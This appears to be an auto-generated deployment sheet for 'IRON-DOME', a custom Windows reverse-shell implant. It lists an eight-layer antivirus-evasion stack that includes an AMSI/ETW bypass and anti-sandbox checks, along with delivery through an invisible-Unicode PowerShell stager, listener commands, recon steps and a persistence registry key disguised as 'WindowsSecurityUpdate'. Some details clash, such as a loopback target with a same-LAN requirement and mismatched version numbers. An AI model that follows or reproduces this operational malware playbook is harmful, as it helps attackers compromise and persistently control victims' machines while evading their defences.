# IRON-DOME v1 — Deployment Package

## Build Summary
| Field | Value |
|-------|-------|
| Target | 127.0.0.1:4443 |
| XOR Key | 0xFC |
| PE SHA256 | N/A (not compiled) |
| PE Size | 0 bytes |
| Evasion Stack | 8 layers |
| VADER | ACTIVE — AMSI/ETW bypass |
| Ghost Stager | Zero-width Unicode |

## Evasion Stack
- Layer 1: XOR string obfuscation\n- Layer 2: Dynamic API resolution\n- Layer 3: Anti-sandbox (timing + screen + disk)\n- Layer 4: PE header stomp\n- Layer 5: ISUN magic auth gate\n- Layer 6: Execution jitter\n- Layer 7: MinGW/gcc PE (no MSVC fingerprint)\n- Layer 8: VADER AMSI/ETW bypass (memory patch + flush)\n

## Deployment
### RADON (listener)
```powershell
python shell/vader_listener.py 4443
```

### GWU07 (delivery)
```
# Option A — PE direct
payloads/iron_dome_v1.exe

# Option B — Ghost stager (PS1) via CHEYANNE
python cheyanne.py
[P] Payload → Select ghost_encoder → Load iron_dome_v1_stager.ps1
```

## Same-LAN Requirement
TCP reverse shell connects to 127.0.0.1:4443.
Both machines MUST be on same router (192.168.1.x/24).
Cross-network: shell exits silently (no error, no alert).

## CHEYANNE Listener Startup
```
python cheyanne.py
[H] Handler → port 4443 → ISUN auth
```

## Expected Result
- Process spawned on target
- 7-12s: TCP callback arrives at RADON
- CHEYANNE receives shell
- Recon: username / hostname / OS / IP
- Persistence: HKCU\Run\WindowsSecurityUpdate

---
*Built by iron_dome_builder.py — IRON-DOME v4.0.0*
*All research authorized. Own hardware only.*
